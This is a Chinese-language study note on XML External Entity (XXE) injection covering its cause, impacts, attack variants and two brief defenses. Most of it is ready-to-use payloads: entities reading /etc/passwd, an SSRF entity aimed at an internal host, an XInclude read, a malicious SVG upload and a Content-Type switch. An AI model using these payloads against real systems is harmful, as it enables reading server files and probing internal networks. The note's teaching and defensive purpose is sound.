# XXE
## 成因
* XML 外部實體注入(XXE)，攻擊者干擾應用程式對 XML 資料的處理，進一步存取系統或相關的外部系統資料。
## 影響
* 取得資料
* SSRF 攻擊
## 攻擊方法
### 取得資料
* 定義包含文件路徑的外部實體，取得資料。
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
    <productId>
    &xxe;
    </productId>
</stockCheck>
```
### SSRF 攻擊
* 定義引入後端系統的 URL 之外部實體，來達成 SSRF 攻擊。
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
<stockCheck>
    <productId>
    &xxe;
    </productId>
</stockCheck>
```
### Attack surface
#### XInclude
* 有些應用程式，可能是在後端才嵌入 xml 來處理資料 (像是 SOAP 協定)，因此我們無法在前端去改寫 `DOCTYPE`，不過我們可以透過 `XInclude` 來使後端處理時來建立XML。
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```
#### file upload
* 有些檔案格式可能是透過 XML 的格式來表達，因此我們也可以透過檔案上傳的方式來達成 XXE 攻擊。
* 包含 XML 的 SVG 圖片
```
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```
#### modified content type
* 有時我們可以透過修改 `Content-Type` 來傳遞 XML 給後端，來達成攻擊。
* 大部分後端都是接收 html form 表單，`Content-Type` 為`application/x-www-form-urlencoded`。
```
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
* 不過有些應用程式，也可以接受傳遞 XML 的格式。
```
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
## 防禦方法
* 禁止外部實體解析。
* 禁止 XInclude。
---
###### tags: `web security`